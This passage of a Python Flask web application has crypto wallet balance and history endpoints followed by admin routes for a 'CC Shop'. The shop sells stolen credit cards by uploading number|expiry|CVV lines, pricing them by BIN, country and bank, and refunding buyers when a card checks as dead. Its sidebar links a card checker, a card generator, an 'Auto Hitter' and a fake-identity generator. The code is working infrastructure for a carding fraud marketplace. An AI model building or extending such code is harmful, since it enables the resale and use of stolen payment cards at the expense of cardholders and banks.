                nanotons = int(r.json().get("result", 0))
            except Exception:
                try:
                    r2 = http_requests.get(
                        f"https://tonapi.io/v2/accounts/{address}",
                        headers={"Accept": "application/json"}, timeout=8,
                    )
                    if r2.ok:
                        nanotons = int(r2.json().get("balance", 0))
                except Exception:
                    pass
            balance_ton = nanotons / 1e9
            balances.append({
                "symbol": "TON", "name": "Toncoin",
                "balance": str(balance_ton), "decimals": 9,
                "contract": None, "logo": None,
            })
            try:
                jetton_r = http_requests.get(
                    f"https://tonapi.io/v2/accounts/{address}/jettons",
                    headers={"Accept": "application/json"},
                    timeout=10,
                )
                if jetton_r.ok:
                    jetton_data = jetton_r.json()
                    _JETTON_MAP = {
                        "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs": ("USDT", "Tether USD", 6),
                        "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT": ("NOT", "Notcoin", 9),
                    }
                    for jt in jetton_data.get("balances", []):
                        jetton_addr = jt.get("jetton", {}).get("address", "")
                        raw_bal = jt.get("balance", "0")
                        meta = jt.get("jetton", {})
                        jt_decimals = int(meta.get("decimals", 9))
                        if jetton_addr in _JETTON_MAP:
                            sym, name, dec = _JETTON_MAP[jetton_addr]
                            jt_decimals = dec
                        else:
                            sym = meta.get("symbol", jetton_addr[:6])
                            name = meta.get("name", "Jetton")
                        try:
                            bal_val = int(raw_bal) / (10 ** jt_decimals)
                        except (ValueError, ZeroDivisionError):
                            bal_val = 0
                        if bal_val > 0 or jetton_addr in _JETTON_MAP:
                            balances.append({
                                "symbol": sym, "name": name,
                                "balance": str(bal_val), "decimals": jt_decimals,
                                "contract": jetton_addr, "logo": None,
                            })
            except Exception:
                pass

        elif chain == "solana":
            r = http_requests.post(
                "https://api.mainnet-beta.solana.com",
                json={"jsonrpc": "2.0", "id": 1, "method": "getBalance",
                      "params": [address]},
                timeout=8,
            )
            r.raise_for_status()
            lamports = r.json().get("result", {}).get("value", 0)
            balances.append({
                "symbol": "SOL", "name": "Solana",
                "balance": str(lamports / 1e9), "decimals": 9,
                "contract": None, "logo": None,
            })
            try:
                spl_r = http_requests.post(
                    "https://api.mainnet-beta.solana.com",
                    json={
                        "jsonrpc": "2.0", "id": 2,
                        "method": "getTokenAccountsByOwner",
                        "params": [
                            address,
                            {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
                            {"encoding": "jsonParsed"}
                        ]
                    },
                    timeout=10,
                )
                spl_r.raise_for_status()
                spl_result = spl_r.json().get("result", {}).get("value", [])
                _SPL_TOKEN_MAP = {
                    "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB": ("USDT", "Tether USD"),
                    "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v": ("USDC", "USD Coin"),
                    "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263": ("BONK", "Bonk"),
                    "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R": ("RAY", "Raydium"),
                    "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN": ("JUP", "Jupiter"),
                    "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm": ("WIF", "dogwifhat"),
                }
                for acct in spl_result:
                    info = acct.get("account", {}).get("data", {}).get("parsed", {}).get("info", {})
                    mint = info.get("mint", "")
                    token_amount = info.get("tokenAmount", {})
                    ui_amount = token_amount.get("uiAmountString", "0")
                    decimals_val = token_amount.get("decimals", 0)
                    if mint in _SPL_TOKEN_MAP:
                        sym, name = _SPL_TOKEN_MAP[mint]
                    elif float(ui_amount or "0") > 0:
                        sym, name = mint[:6].upper(), "SPL Token"
                    else:
                        continue
                    balances.append({
                        "symbol": sym, "name": name,
                        "balance": ui_amount, "decimals": decimals_val,
                        "contract": mint, "logo": None,
                    })
            except Exception:
                pass

        elif chain == "bitcoin":
            r = http_requests.get(
                f"https://blockchain.info/rawaddr/{address}?limit=0",
                timeout=8,
            )
            r.raise_for_status()
            data = r.json()
            balance_btc = data.get("final_balance", 0) / 1e8
            balances.append({
                "symbol": "BTC", "name": "Bitcoin",
                "balance": str(balance_btc), "decimals": 8,
                "contract": None, "logo": None,
            })

        elif chain == "tron":
            r = http_requests.get(
                f"https://apilist.tronscan.org/api/account?address={address}",
                timeout=8,
            )
            r.raise_for_status()
            data = r.json()
            trx_balance = data.get("balance", 0) / 1e6
            balances.append({
                "symbol": "TRX", "name": "TRON",
                "balance": str(trx_balance), "decimals": 6,
                "contract": None, "logo": None,
            })
            trc20_list = data.get("trc20token_balances", [])
            if not trc20_list:
                trc20_list = data.get("tokenBalances", [])
            _TRC20_MAP = {
                "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t": ("USDT", "Tether USD", 6),
                "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8": ("USDC", "USD Coin", 6),
                "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR": ("WTRX", "Wrapped TRX", 6),
                "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4": ("BTT", "BitTorrent", 18),
                "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9": ("JST", "JUST", 18),
                "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S": ("SUN", "Sun Token", 18),
            }
            for tok in trc20_list:
                contract_addr = tok.get("tokenId", "") or tok.get("contract_address", "")
                raw_balance = tok.get("balance", "0")
                decimals_val = int(tok.get("tokenDecimal", tok.get("decimals", 0)))
                if contract_addr in _TRC20_MAP:
                    sym, name, dec = _TRC20_MAP[contract_addr]
                    if not decimals_val:
                        decimals_val = dec
                else:
                    sym = tok.get("tokenAbbr", tok.get("symbol", contract_addr[:6]))
                    name = tok.get("tokenName", tok.get("name", "TRC-20 Token"))
                try:
                    bal_float = int(raw_balance) / (10 ** decimals_val) if decimals_val else float(raw_balance)
                except (ValueError, ZeroDivisionError):
                    bal_float = 0
                if bal_float > 0 or contract_addr in _TRC20_MAP:
                    balances.append({
                        "symbol": sym, "name": name,
                        "balance": str(bal_float), "decimals": decimals_val,
                        "contract": contract_addr, "logo": None,
                    })

        return jsonify({"chain": chain, "address": address, "balances": balances})

    except Exception as e:
        return jsonify({"error": f"Balance fetch failed: {e}"}), 502


@app.route('/api/wallet/tx-history', methods=['GET'])
def api_wallet_tx_history():
    """
    Return transaction history for a given chain + address.
    Query params: ?chain=ethereum&address=0x...&limit=20
    Fetches from public block explorer APIs.
    """
    chain = request.args.get("chain", "").lower()
    address = request.args.get("address", "").strip()
    limit = min(int(request.args.get("limit", 20)), 50)

    if not chain or chain not in _SUPPORTED_CHAINS:
        return jsonify({"error": "Unsupported or missing chain"}), 400
    if not address:
        return jsonify({"error": "address is required"}), 400

    txs = []
    try:
        _BLOCKSCOUT_APIS = {
            "ethereum": ("https://eth.blockscout.com/api", "ETH", 18),
            "bsc": ("https://bsc.blockscout.com/api", "BNB", 18),
            "polygon": ("https://polygon.blockscout.com/api", "POL", 18),
            "arbitrum": ("https://arbitrum.blockscout.com/api", "ETH", 18),
            "optimism": ("https://optimism.blockscout.com/api", "ETH", 18),
            "avalanche": ("https://avax.blockscout.com/api", "AVAX", 18),
        }
        if chain in _BLOCKSCOUT_APIS:
            api_url, sym, dec = _BLOCKSCOUT_APIS[chain]
            try:
                r = http_requests.get(
                    api_url,
                    params={"module": "account", "action": "txlist",
                            "address": address, "sort": "desc",
                            "offset": limit, "page": 1},
                    timeout=12,
                )
                result_data = r.json().get("result")
                if isinstance(result_data, list):
                    for tx in result_data:
                        if isinstance(tx, dict):
                            txs.append({
                                "hash": tx.get("hash"),
                                "from": tx.get("from"),
                                "to": tx.get("to"),
                                "value": str(int(tx.get("value", 0)) / (10 ** dec)),
                                "symbol": sym,
                                "timestamp": int(tx.get("timeStamp", 0)),
                                "status": "ok" if tx.get("isError") == "0" else "failed",
                            })
            except Exception:
                pass

        elif chain == "ton":
            r = http_requests.get(
                "https://toncenter.com/api/v2/getTransactions",
                params={"address": address, "limit": limit},
                timeout=8,
            )
            for tx in (r.json().get("result") or []):
                msg = tx.get("in_msg", {}) or {}
                out_msgs = tx.get("out_msgs", []) or []
                amount_nano = int(msg.get("value", 0) or 0)
                txs.append({
                    "hash": tx.get("transaction_id", {}).get("hash"),
                    "from": msg.get("source"),
                    "to": msg.get("destination") or (out_msgs[0].get("destination") if out_msgs else None),
                    "value": str(amount_nano / 1e9),
                    "symbol": "TON",
                    "timestamp": int(tx.get("utime", 0)),
                    "status": "ok",
                })

        elif chain == "solana":
            r = http_requests.post(
                "https://api.mainnet-beta.solana.com",
                json={"jsonrpc": "2.0", "id": 1, "method": "getSignaturesForAddress",
                      "params": [address, {"limit": limit}]},
                timeout=8,
            )
            for sig_info in (r.json().get("result") or []):
                txs.append({
                    "hash": sig_info.get("signature"),
                    "from": None,
                    "to": None,
                    "value": None,
                    "symbol": "SOL",
                    "timestamp": int(sig_info.get("blockTime") or 0),
                    "status": "failed" if sig_info.get("err") else "ok",
                })

        elif chain == "bitcoin":
            r = http_requests.get(
                f"https://blockchain.info/rawaddr/{address}?limit={limit}",
                timeout=8,
            )
            for tx in (r.json().get("txs") or []):
                out_total = sum(o.get("value", 0) for o in tx.get("out", []))
                txs.append({
                    "hash": tx.get("hash"),
                    "from": None,
                    "to": None,
                    "value": str(out_total / 1e8),
                    "symbol": "BTC",
                    "timestamp": int(tx.get("time", 0)),
                    "status": "ok",
                })

        elif chain == "tron":
            r = http_requests.get(
                f"https://apilist.tronscan.org/api/transaction",
                params={"address": address, "limit": limit, "sort": "-timestamp"},
                timeout=8,
            )
            for tx in (r.json().get("data") or []):
                txs.append({
                    "hash": tx.get("hash"),
                    "from": tx.get("ownerAddress"),
                    "to": tx.get("toAddress"),
                    "value": str(int(tx.get("amount", 0)) / 1e6),
                    "symbol": "TRX",
                    "timestamp": int(tx.get("timestamp", 0)) // 1000,
                    "status": "ok" if tx.get("contractRet") == "SUCCESS" else "failed",
                })

        return jsonify({"chain": chain, "address": address, "transactions": txs})

    except Exception as e:
        return jsonify({"error": f"History fetch failed: {e}"}), 502



# ─── CC SHOP ADMIN ROUTES ────────────────────────────────────────────────────
from html import escape as _h
from modules.cc_shop import (
    bulk_upload_cards, get_shop_stats, get_all_stock, get_available_cards,
    purchase_card, get_purchased_cards, get_user_balance, add_user_balance,
    set_user_balance, delete_cards, remove_cards, get_default_price,
    set_default_price, update_card_price, get_stock_summary, get_filter_options,
    get_purchase_history, get_shop_setting, set_shop_setting,
    update_bin_price, update_country_price, update_brand_price,
    get_profit_percentage, set_profit_percentage, refund_purchase,
    get_refund_window_minutes, set_refund_window_minutes,
    get_non_refundable_banks, add_non_refundable_bank, remove_non_refundable_bank,
    is_bank_non_refundable, clear_all_stock,
    add_price_rule, remove_price_rule, get_price_rules, apply_price_rules_to_stock,
    create_shop_deposit_invoice, check_pending_deposits
)
from modules.fake_identity import generate_holder_info

@app.route('/admin/ccshop')
@admin_required
def admin_ccshop():
    stats = get_shop_stats()
    page = request.args.get('page', 1, type=int)
    country = request.args.get('country', '')
    brand = request.args.get('brand', '')
    card_type = request.args.get('type', '')
    bank_filter = request.args.get('bank', '')
    status_filter = request.args.get('status', '')
    stock = get_all_stock(country=country, brand=brand, card_type=card_type, bank=bank_filter, status=status_filter, page=page, per_page=50)
    default_price = get_default_price()
    profit_pct = get_profit_percentage()
    refund_window = get_refund_window_minutes()
    blocked_banks = get_non_refundable_banks()
    price_rules = get_price_rules()
    filter_opts = get_filter_options()

    cards_html = ""
    for c in stock['cards']:
        st = c.get('status','')
        badge = '<span style="color:#4ade80;">Available</span>' if st == 'available' else '<span style="color:#ef4444;">Sold</span>' if st == 'sold' else '<span style="color:#999;">Removed</span>'
        cards_html += f"""<tr>
            <td><input type="checkbox" name="card_ids" value="{c['id']}" class="card-check"></td>
            <td>{c['id']}</td>
            <td><code>{_h(c.get('cc_number','')[:6])}******</code></td>
            <td>{_h(c.get('bin6',''))}</td>
            <td>{_h(c.get('country',''))} ({_h(c.get('country_code',''))})</td>
            <td>{_h(c.get('brand',''))}</td>
            <td>{_h(c.get('card_type',''))}</td>
            <td>{_h((c.get('bank','') or '')[:30])}</td>
            <td>
                <form method="POST" action="/admin/ccshop/card-price" style="display:inline-flex;gap:4px;align-items:center;">
                    <input type="hidden" name="card_id" value="{c['id']}">
                    <input type="number" name="price" step="0.01" value="{float(c.get('price',0)):.2f}" style="width:70px;padding:3px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:4px;color:#fff;font-size:0.8em;">
                    <button type="submit" style="padding:2px 6px;background:#e94560;border:none;border-radius:4px;color:#fff;cursor:pointer;font-size:0.7em;">Set</button>
                </form>
            </td>
            <td>{badge}</td>
            <td>{_h(str(c.get('uploaded_at',''))[:10])}</td>
        </tr>"""

    pagination = ""
    if stock['pages'] > 1:
        for p in range(1, stock['pages'] + 1):
            active = 'style="background:#e94560;color:#fff;"' if p == page else ''
            pagination += f'<a href="/admin/ccshop?page={p}&country={_h(country)}&brand={_h(brand)}&type={_h(card_type)}&bank={_h(bank_filter)}&status={_h(status_filter)}" class="btn btn-sm" {active}>{p}</a> '

    return render_template_string(f"""
    <html>
    <head><title>CC Shop - Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" class="active" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header"><h1>CC Shop Management</h1></div>
            <div class="stats-grid">
                <div class="stat-card"><h3>{stats['available']}</h3><p>Available</p></div>
                <div class="stat-card"><h3>{stats['sold']}</h3><p>Sold</p></div>
                <div class="stat-card"><h3>${stats['revenue']:.2f}</h3><p>Revenue</p></div>
                <div class="stat-card"><h3>{stats['total']}</h3><p>Total Stock</p></div>
            </div>

            <div class="card">
                <h2>Upload Cards</h2>
                <div style="display:flex;gap:20px;flex-wrap:wrap;">
                    <div style="flex:1;min-width:280px;">
                        <h3 style="font-size:0.9em;opacity:0.7;margin-bottom:10px;">Bulk Upload (.txt file)</h3>
                        <form method="POST" action="/admin/ccshop/upload" enctype="multipart/form-data" style="display:flex;gap:10px;align-items:end;flex-wrap:wrap;">
                            <div>
                                <label style="display:block;margin-bottom:5px;opacity:0.6;font-size:0.85em;">Card File</label>
                                <input type="file" name="file" accept=".txt" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;">
                            </div>
                            <div>
                                <label style="display:block;margin-bottom:5px;opacity:0.6;font-size:0.85em;">Price ($)</label>
                                <input type="number" name="price" step="0.01" value="{default_price}" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:80px;">
                            </div>
                            <button type="submit" class="btn btn-primary">Upload</button>
                        </form>
                    </div>
                    <div style="flex:1;min-width:280px;">
                        <h3 style="font-size:0.9em;opacity:0.7;margin-bottom:10px;">Add Single Card</h3>
                        <form method="POST" action="/admin/ccshop/add-single" style="display:flex;gap:10px;align-items:end;flex-wrap:wrap;">
                            <div style="flex:1;min-width:200px;">
                                <label style="display:block;margin-bottom:5px;opacity:0.6;font-size:0.85em;">CC (number|mm|yy|cvv)</label>
                                <input type="text" name="cc_line" required placeholder="4111111111111111|12|2026|123" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:100%;font-family:monospace;">
                            </div>
                            <div>
                                <label style="display:block;margin-bottom:5px;opacity:0.6;font-size:0.85em;">Price ($)</label>
                                <input type="number" name="price" step="0.01" value="{default_price}" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:80px;">
                            </div>
                            <button type="submit" class="btn btn-primary">Add</button>
                        </form>
                    </div>
                </div>
            </div>

            <div class="card">
                <h2>Pricing Controls</h2>
                <div style="display:flex;gap:20px;flex-wrap:wrap;margin-bottom:15px;">
                    <div>
                        <h3 style="font-size:0.9em;opacity:0.7;margin-bottom:8px;">Default Price (fallback): ${default_price:.2f}</h3>
                        <form method="POST" action="/admin/ccshop/set-price" style="display:flex;gap:10px;align-items:center;">
                            <input type="number" name="price" step="0.01" value="{default_price}" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:100px;">
                            <button type="submit" class="btn btn-primary">Set Default</button>
                        </form>
                    </div>
                </div>

                <hr style="border-color:rgba(255,255,255,0.1);margin:15px 0;">
                <h3 style="font-size:0.95em;margin-bottom:8px;color:#e94560;">Price Rules (auto-applied on upload)</h3>
                <p style="opacity:0.6;font-size:0.85em;margin-bottom:10px;">Priority: BIN &gt; Brand &gt; Country &gt; Default. New cards get priced automatically.</p>

                <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
                    <form method="POST" action="/admin/ccshop/add-price-rule" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
                        <select name="rule_type" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;">
                            <option value="bin">BIN Prefix</option>
                            <option value="country">Country Code</option>
                            <option value="brand">Brand</option>
                        </select>
                        <input type="text" name="target" placeholder="e.g. 411111, US, VISA" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:140px;">
                        <input type="number" name="price" step="0.01" min="0.01" placeholder="Price $" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:100px;">
                        <button type="submit" class="btn btn-primary">Add Rule</button>
                    </form>
                    <form method="POST" action="/admin/ccshop/apply-price-rules" style="display:inline;">
                        <button type="submit" class="btn" style="background:#6366f1;" title="Re-apply all rules to existing available stock">Apply to Stock</button>
                    </form>
                </div>

                {'<div style="overflow-x:auto;"><table style="width:100%;font-size:0.85em;"><tr><th>Type</th><th>Target</th><th>Price</th><th></th></tr>' + ''.join(f'<tr><td><span style="background:rgba(233,69,96,0.2);color:#e94560;padding:2px 8px;border-radius:4px;font-size:0.85em;font-weight:600;">{_h(r.get("rule_type","").upper())}</span></td><td style="font-weight:600;">{_h(r.get("target",""))}</td><td style="color:#4ade80;font-weight:700;">${float(r.get("price",0)):.2f}</td><td><form method="POST" action="/admin/ccshop/remove-price-rule" style="display:inline;"><input type="hidden" name="rule_id" value="{r.get("id",0)}"><button type="submit" style="padding:3px 10px;background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.4);border-radius:6px;color:#ef4444;cursor:pointer;font-size:0.8em;">&times;</button></form></td></tr>' for r in price_rules) + '</table></div>' if price_rules else '<p style="opacity:0.4;font-size:0.85em;">No price rules set. All cards use default price.</p>'}

                <div style="margin-top:12px;padding:10px;background:rgba(255,255,255,0.03);border-radius:8px;font-size:0.8em;opacity:0.5;">
                    <b>Quick ref:</b> Countries in stock: {', '.join(sorted(set(c.get('code','') for c in filter_opts.get('countries',[]) if c.get('code')))) or 'none'} |
                    Brands: {', '.join(sorted(set(b for b in filter_opts.get('brands',[]) if b))) or 'none'}
                </div>
                <div style="margin-top:12px;"><a href="/admin/ccshop/purchases" style="color:#e94560;text-decoration:none;">View Purchase History &rarr;</a></div>
            </div>

            <div class="card">
                <h2>Refund & Profit Settings</h2>
                <p style="opacity:0.6;font-size:0.85em;margin-bottom:10px;">When a card checks as DEAD, user gets an automatic refund minus your profit %. Set to 100% = no refund at all.</p>
                <form method="POST" action="/admin/ccshop/set-profit" style="display:flex;gap:10px;align-items:center;margin-bottom:15px;">
                    <label style="opacity:0.7;">Profit %:</label>
                    <input type="number" name="profit" step="0.1" min="0" max="100" value="{profit_pct}" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:80px;">
                    <button type="submit" class="btn btn-primary">Set</button>
                    <span style="opacity:0.5;font-size:0.85em;margin-left:10px;">Current: {profit_pct}% — Refund on dead: {100-profit_pct}% of price</span>
                </form>

                <hr style="border-color:rgba(255,255,255,0.1);margin:15px 0;">
                <h3 style="font-size:0.95em;margin-bottom:8px;color:#e94560;">Refund Time Window</h3>
                <p style="opacity:0.6;font-size:0.85em;margin-bottom:8px;">Users can only request refund within this many minutes after purchase. After that, no refund.</p>
                <form method="POST" action="/admin/ccshop/set-refund-window" style="display:flex;gap:10px;align-items:center;margin-bottom:15px;">
                    <label style="opacity:0.7;">Minutes:</label>
                    <input type="number" name="minutes" min="1" max="1440" value="{refund_window}" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:80px;">
                    <button type="submit" class="btn btn-primary">Set</button>
                    <span style="opacity:0.5;font-size:0.85em;margin-left:10px;">Current: {refund_window} min</span>
                </form>

                <hr style="border-color:rgba(255,255,255,0.1);margin:15px 0;">
                <h3 style="font-size:0.95em;margin-bottom:8px;color:#e94560;">Non-Refundable Banks</h3>
                <p style="opacity:0.6;font-size:0.85em;margin-bottom:8px;">Cards from these banks will NEVER be refunded, even if dead. Buyer assumes all risk.</p>
                <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px;">
                    {''.join(f'<form method="POST" action="/admin/ccshop/remove-blocked-bank" style="display:inline;"><input type="hidden" name="bank" value="{_h(b)}"><button type="submit" style="padding:5px 12px;background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.4);border-radius:6px;color:#ef4444;cursor:pointer;font-size:0.85em;">{_h(b)} &times;</button></form>' for b in blocked_banks) if blocked_banks else '<span style="opacity:0.4;font-size:0.85em;">No blocked banks</span>'}
                </div>
                <form method="POST" action="/admin/ccshop/add-blocked-bank" style="display:flex;gap:10px;align-items:center;">
                    <input type="text" name="bank" placeholder="Bank name (e.g. Chase)" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:200px;">
                    <button type="submit" class="btn btn-primary">Add Bank</button>
                </form>
            </div>

            <div class="card">
                <h2>Manage Balance</h2>
                <form method="POST" action="/admin/ccshop/balance" style="display:flex;gap:10px;align-items:end;flex-wrap:wrap;">
                    <div>
                        <label style="display:block;margin-bottom:5px;opacity:0.7;">User ID</label>
                        <input type="number" name="user_id" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:150px;">
                    </div>
                    <div>
                        <label style="display:block;margin-bottom:5px;opacity:0.7;">Amount ($)</label>
                        <input type="number" name="amount" step="0.01" required style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:120px;">
                    </div>
                    <button type="submit" name="action" value="add" class="btn btn-primary">Add Balance</button>
                    <button type="submit" name="action" value="deduct" class="btn" style="background:#ef4444;">Deduct</button>
                    <button type="submit" name="action" value="set" class="btn" style="background:#6366f1;">Set Balance</button>
                </form>
            </div>

            <div class="card">
                <h2>Stock ({stock['total']} cards)</h2>
                <form method="GET" action="/admin/ccshop" style="display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap;">
                    <input type="text" name="country" value="{_h(country)}" placeholder="Country" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:120px;">
                    <input type="text" name="brand" value="{_h(brand)}" placeholder="Brand" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:120px;">
                    <input type="text" name="type" value="{_h(card_type)}" placeholder="Type" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:100px;">
                    <input type="text" name="bank" value="{_h(bank_filter)}" placeholder="Bank" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;width:120px;">
                    <select name="status" style="padding:8px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;">
                        <option value="">All Status</option>
                        <option value="available" {"selected" if status_filter=="available" else ""}>Available</option>
                        <option value="sold" {"selected" if status_filter=="sold" else ""}>Sold</option>
                        <option value="removed" {"selected" if status_filter=="removed" else ""}>Removed</option>
                    </select>
                    <button type="submit" class="btn btn-primary">Filter</button>
                </form>
                <div style="display:flex;gap:10px;margin-bottom:15px;padding:12px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:8px;align-items:center;flex-wrap:wrap;">
                    <span style="font-size:0.85em;opacity:0.7;">Wipe stock for fresh upload:</span>
                    <form method="POST" action="/admin/ccshop/clear-all" style="display:inline;" onsubmit="return confirm('DELETE ALL AVAILABLE CARDS?\\nSold cards & purchases will be kept.\\nThis cannot be undone!');">
                        <button type="submit" name="mode" value="available" class="btn" style="background:#f59e0b;font-size:0.85em;">Clear Available Only</button>
                    </form>
                    <form method="POST" action="/admin/ccshop/clear-all" style="display:inline;" onsubmit="return confirm('⚠️ NUKE EVERYTHING?\\nThis will delete ALL cards (available + sold) AND all purchase history.\\nThis CANNOT be undone!');">
                        <button type="submit" name="mode" value="all" class="btn btn-danger" style="font-size:0.85em;">Nuke All Stock + History</button>
                    </form>
                </div>
                <form method="POST" action="/admin/ccshop/bulk-action" id="bulkForm">
                    <div style="margin-bottom:10px;display:flex;gap:10px;">
                        <button type="button" onclick="toggleAll()" class="btn" style="background:rgba(255,255,255,0.1);">Select All</button>
                        <button type="submit" name="action" value="delete" class="btn btn-danger">Delete Selected</button>
                        <button type="submit" name="action" value="remove" class="btn" style="background:#f59e0b;">Mark Removed</button>
                    </div>
                    <div style="overflow-x:auto;">
                    <table>
                        <tr><th></th><th>ID</th><th>Card</th><th>BIN</th><th>Country</th><th>Brand</th><th>Type</th><th>Bank</th><th>Price</th><th>Status</th><th>Date</th></tr>
                        {cards_html if cards_html else '<tr><td colspan="11">No cards in stock</td></tr>'}
                    </table>
                    </div>
                </form>
                <div style="margin-top:15px;display:flex;gap:5px;flex-wrap:wrap;">{pagination}</div>
            </div>
        </div>
        <script>
        function toggleSidebar(){{document.querySelector('.sidebar').classList.toggle('open');document.querySelector('.sidebar-overlay').classList.toggle('open');}}
        function closeSidebar(){{document.querySelector('.sidebar').classList.remove('open');document.querySelector('.sidebar-overlay').classList.remove('open');}}
        function toggleAll(){{let checks=document.querySelectorAll('.card-check');let allChecked=[...checks].every(c=>c.checked);checks.forEach(c=>c.checked=!allChecked);}}
        </script>
    </body>
    </html>
    """)

@app.route('/admin/ccshop/upload', methods=['POST'])
@admin_required
def admin_ccshop_upload():
    file = request.files.get('file')
    price = request.form.get('price', '5.00')
    try:
        price = float(price)
    except:
        price = 5.00

    if not file:
        return redirect('/admin/ccshop')

    content = file.read().decode('utf-8', errors='ignore')
    lines = content.strip().split('\n')
    result = bulk_upload_cards(lines, default_price=price)

    session['upload_result'] = json.dumps(result)
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/add-single', methods=['POST'])
@admin_required
def admin_ccshop_add_single():
    cc_line = request.form.get('cc_line', '').strip()
    price = request.form.get('price', '5.00')
    try:
        price = float(price)
    except:
        price = 5.00
    if cc_line:
        result = bulk_upload_cards([cc_line], default_price=price)
        session['upload_result'] = json.dumps(result)
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/set-price', methods=['POST'])
@admin_required
def admin_ccshop_set_price():
    try:
        price = float(request.form.get('price', 5.00))
        set_default_price(price)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/balance', methods=['POST'])
@admin_required
def admin_ccshop_balance():
    try:
        user_id = int(request.form.get('user_id', 0))
        amount = float(request.form.get('amount', 0))
        action = request.form.get('action', 'add')
        if user_id and amount != 0:
            if action == 'set':
                set_user_balance(user_id, max(0, amount))
            elif action == 'deduct':
                add_user_balance(user_id, -abs(amount))
            else:
                add_user_balance(user_id, amount)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/clear-all', methods=['POST'])
@admin_required
def admin_ccshop_clear_all():
    mode = request.form.get('mode', 'available')
    count = clear_all_stock(only_available=(mode == 'available'))
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/bulk-action', methods=['POST'])
@admin_required
def admin_ccshop_bulk_action():
